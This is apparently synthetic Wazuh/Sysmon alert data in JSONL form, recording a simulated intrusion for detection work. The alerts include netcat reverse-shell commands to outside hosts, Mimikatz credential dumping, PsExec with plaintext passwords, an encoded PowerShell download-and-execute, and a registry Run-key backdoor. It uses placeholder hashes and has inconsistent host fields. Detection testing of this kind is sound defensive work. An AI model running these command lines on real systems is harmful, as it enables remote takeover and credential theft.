{"timestamp":"2026-01-12T10:00:00+0000","rule":{"level":12,"description":"Suspicious reverse shell command detected","id":"100002","groups":["audit","attack"]},"agent":{"id":"001","name":"Windows11","ip":"192.168.1.100"},"data":{"win":{"eventdata":{"originalFileName":"NC.EXE","image":"C:\\Windows\\System32\\nc.exe","product":"Netcat","parentProcessGuid":"{45cd4aff-35fc-6463-6903-000000001300}","description":"Netcat - Network Swiss Army Knife","logonGuid":"{45cd4aff-2ce5-6463-2543-290000000000}","parentCommandLine":"C:\\Windows\\system32\\cmd.exe","processGuid":"{45cd4aff-35fc-6463-6a03-000000001300}","logonId":"0x294325","parentProcessId":"7652","processId":"4064","currentDirectory":"C:\\Users\\Admin\\","utcTime":"2026-01-12 10:00:00.512","hashes":"SHA256=D9BE711BE2BF88096BB91C25DF775D90B964264AB25EC49CF04711D8C1F089F6,MD5=5F7264BD237FAEA46FB240785B78AFAC","parentImage":"C:\\Windows\\System32\\cmd.exe","commandLine":"nc.exe 1.1.1.1 4444 -e cmd.exe","integrityLevel":"High","user":"Windows11\\Admin"},"system":{"eventID":"1","computer":"Windows11","providerName":"Microsoft-Windows-Sysmon"}}}}
{"timestamp":"2026-01-12T10:05:00+0000","rule":{"level":15,"description":"Mimikatz credential dumping detected","id":"100003","groups":["audit","credential_access"]},"agent":{"id":"001","name":"Windows11","ip":"192.168.1.100"},"data":{"win":{"eventdata":{"image":"C:\\Temp\\mimikatz.exe","processGuid":"{45cd4aff-35fc-6463-7a03-000000001400}","processId":"5120","parentProcessId":"4064","parentImage":"C:\\Windows\\System32\\nc.exe","commandLine":"mimikatz.exe privilege::debug sekurlsa::logonpasswords","utcTime":"2026-01-12 10:05:00.123","hashes":"SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1","user":"Windows11\\Admin"},"system":{"eventID":"1","computer":"Windows11"}}}}
{"timestamp":"2026-01-12T10:10:00+0000","rule":{"level":10,"description":"PowerShell execution with encoded command","id":"100004","groups":["powershell","execution"]},"agent":{"id":"002","name":"victim-01","ip":"192.168.1.101"},"data":{"win":{"eventdata":{"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","processId":"6789","parentProcessId":"1234","commandLine":"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA","utcTime":"2026-01-12 10:10:00.000","user":"victim-01\\user"},"system":{"eventID":"1","computer":"victim-01"}}}}
{"timestamp":"2026-01-12T10:15:00+0000","rule":{"level":7,"description":"File modified","id":"550","groups":["syscheck","file_integrity"]},"agent":{"id":"003","name":"linux-server","ip":"192.168.1.102"},"syscheck":{"path":"/etc/passwd","event":"modified","sha256_after":"abc123def456789","md5_after":"def456789abc123","size_after":2048,"uname_after":"root","perm_after":"rw-r--r--"}}
{"timestamp":"2026-01-12T10:20:00+0000","rule":{"level":12,"description":"Lateral movement detected - PsExec","id":"100005","groups":["lateral_movement","remote_access"]},"agent":{"id":"002","name":"victim-01","ip":"192.168.1.101"},"data":{"win":{"eventdata":{"image":"C:\\Windows\\PsExec.exe","processId":"8888","commandLine":"psexec.exe \\\\192.168.1.103 -u admin -p password cmd.exe","utcTime":"2026-01-12 10:20:00.000","user":"victim-01\\admin"},"system":{"eventID":"1","computer":"victim-01"}}}}
{"timestamp":"2026-01-12T10:20:00+0000","rule":{"level":12,"description":"Lateral movement detected - PsExec","id":"100005","groups":["lateral_movement","remote_access"]},"agent":{"id":"002","name":"victim-01","ip":"192.168.1.101"},"data":{"win":{"eventdata":{"image":"C:\\Windows\\PsExec.exe","processId":"8888","commandLine":"psexec.exe \\\\192.168.1.103 -u admin -p password cmd.exe","utcTime":"2026-01-12 10:20:00.000","user":"victim-01\\admin"},"system":{"eventID":"1","computer":"victim-01"}}}}
{"timestamp":"2026-01-12T10:20:00+0000","rule":{"level":12,"description":"Lateral movement detected - PsExec","id":"100005","groups":["lateral_movement","remote_access"]},"agent":{"id":"002","name":"victim-01","ip":"192.168.1.101"},"data":{"win":{"eventdata":{"image":"C:\\Windows\\PsExec.exe","processId":"8888","commandLine":"psexec.exe \\\\192.168.1.103 -u admin -p password cmd.exe","utcTime":"2026-01-12 10:20:00.000","user":"victim-01\\admin"},"system":{"eventID":"1","computer":"victim-01"}}}}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "2503", "destinationIp": "100.209.210.99", "destinationPort": "53", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:58:36+0000"}
{"rule": {"level": 12, "description": "Suspicious command execution", "id": "100006", "groups": ["command_execution"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "2677", "parentProcessId": "959", "commandLine": "cmd.exe /c whoami", "user": "Windows11\\User"}, "system": {"eventID": "1", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:58:39+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "7621", "destinationIp": "19.151.99.139", "destinationPort": "80", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:58:42+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "8685", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T11:58:45+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "2278", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T11:58:48+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "8410", "destinationIp": "197.64.237.16", "destinationPort": "53", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:58:51+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "6951", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T11:58:54+0000"}
{"rule": {"level": 12, "description": "Suspicious command execution", "id": "100006", "groups": ["command_execution"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "3997", "parentProcessId": "853", "commandLine": "cmd.exe /c whoami", "user": "Windows11\\User"}, "system": {"eventID": "1", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:58:57+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "8065", "destinationIp": "235.100.106.47", "destinationPort": "53", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:59:00+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "8713", "destinationIp": "248.229.89.52", "destinationPort": "53", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:59:03+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "5011", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T11:59:06+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "8491", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T11:59:09+0000"}
{"rule": {"level": 12, "description": "Suspicious command execution", "id": "100006", "groups": ["command_execution"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "5677", "parentProcessId": "858", "commandLine": "cmd.exe /c whoami", "user": "Windows11\\User"}, "system": {"eventID": "1", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:59:15+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "2084", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T11:59:21+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "7712", "destinationIp": "134.205.68.33", "destinationPort": "443", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T11:59:24+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "7938", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:10:16+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "4622", "destinationIp": "199.128.129.245", "destinationPort": "8080", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T12:10:22+0000"}
{"rule": {"level": 12, "description": "Suspicious command execution", "id": "100006", "groups": ["command_execution"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "7656", "parentProcessId": "963", "commandLine": "cmd.exe /c whoami", "user": "Windows11\\User"}, "system": {"eventID": "1", "computer": "Windows11"}}}, "timestamp": "2026-01-12T12:10:25+0000"}
{"rule": {"level": 12, "description": "Suspicious command execution", "id": "100006", "groups": ["command_execution"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "8349", "parentProcessId": "665", "commandLine": "cmd.exe /c whoami", "user": "Windows11\\User"}, "system": {"eventID": "1", "computer": "Windows11"}}}, "timestamp": "2026-01-12T12:10:28+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "3292", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:10:31+0000"}
{"rule": {"level": 12, "description": "Suspicious command execution", "id": "100006", "groups": ["command_execution"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "7935", "parentProcessId": "577", "commandLine": "cmd.exe /c whoami", "user": "Windows11\\User"}, "system": {"eventID": "1", "computer": "Windows11"}}}, "timestamp": "2026-01-12T12:10:34+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "8646", "destinationIp": "71.249.146.52", "destinationPort": "8080", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T12:10:37+0000"}
{"rule": {"level": 8, "description": "Network connection established", "id": "100008", "groups": ["network"]}, "agent": {"id": "001", "name": "Windows11", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "1734", "destinationIp": "226.253.200.60", "destinationPort": "443", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "Windows11"}}}, "timestamp": "2026-01-12T12:10:40+0000"}
{"rule": {"level": 10, "description": "PowerShell script execution", "id": "100007", "groups": ["powershell"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9228", "commandLine": "powershell.exe Get-Process", "user": "victim-01\\user"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:10:46+0000"}
{"rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:19:42+0000"}
{"rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\mimikatz.exe", "processId": "9003", "parentProcessId": "9002", "parentImage": "C:\\Temp\\nc.exe", "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:19:45+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:19:48+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:19:51+0000"}
{"rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "sha256_after": "abc123def456789modified", "md5_after": "def456789abc123", "size_after": 2048, "uname_after": "root", "perm_after": "rw-r--r--"}, "timestamp": "2026-01-12T12:19:54+0000"}
{"rule": {"level": 10, "description": "Registry Run key modified for persistence", "id": "100106", "groups": ["persistence", "registry", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\reg.exe", "processId": "9126", "parentProcessId": "9001", "commandLine": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:19:57+0000"}
{"rule": {"level": 15, "description": "WebShell detected - suspicious web process spawning cmd", "id": "100101", "groups": ["webshell", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "9001", "parentProcessId": "8888", "parentImage": "C:\\inetpub\\wwwroot\\w3wp.exe", "commandLine": "cmd.exe /c whoami", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=D9BE711BE2BF88096BB91C25DF775D90B964264AB25EC49CF04711D8C1F089F6"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:20:00+0000"}
{"rule": {"level": 8, "description": "Suspicious data compression activity", "id": "100109", "groups": ["collection", "exfiltration"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\tar.exe", "processId": "9206", "parentProcessId": "9005", "commandLine": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:20:03+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "processId": "7025", "parentProcessId": "773", "commandLine": "chrome.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:20:06+0000"}
{"rule": {"level": 15, "description": "WebShell detected - suspicious web process spawning cmd", "id": "100101", "groups": ["webshell", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "9001", "parentProcessId": "8888", "parentImage": "C:\\inetpub\\wwwroot\\w3wp.exe", "commandLine": "cmd.exe /c whoami", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=D9BE711BE2BF88096BB91C25DF775D90B964264AB25EC49CF04711D8C1F089F6"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:20:09+0000"}
{"rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T12:20:15+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T12:20:18+0000"}
{"rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:16:35+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\explorer.exe", "processId": "4567", "parentProcessId": "557", "commandLine": "explorer.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:16:38+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:16:44+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:16:50+0000"}
{"rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "sha256_after": "abc123def456789modified", "md5_after": "def456789abc123", "size_after": 2048, "uname_after": "root", "perm_after": "rw-r--r--"}, "timestamp": "2026-01-12T14:16:53+0000"}
{"rule": {"level": 10, "description": "Suspicious network connection to known C2 server", "id": "100108", "groups": ["c2", "command_and_control", "network"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "sourceIp": "192.168.1.100", "sourcePort": "50054", "destinationIp": "45.67.89.123", "destinationPort": "4444", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:19:29+0000"}
{"rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\mimikatz.exe", "processId": "9003", "parentProcessId": "9002", "parentImage": "C:\\Temp\\nc.exe", "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:19:32+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:19:35+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:19:38+0000"}
{"rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "sha256_after": "abc123def456789modified", "md5_after": "def456789abc123", "size_after": 2048, "uname_after": "root", "perm_after": "rw-r--r--"}, "timestamp": "2026-01-12T14:19:41+0000"}
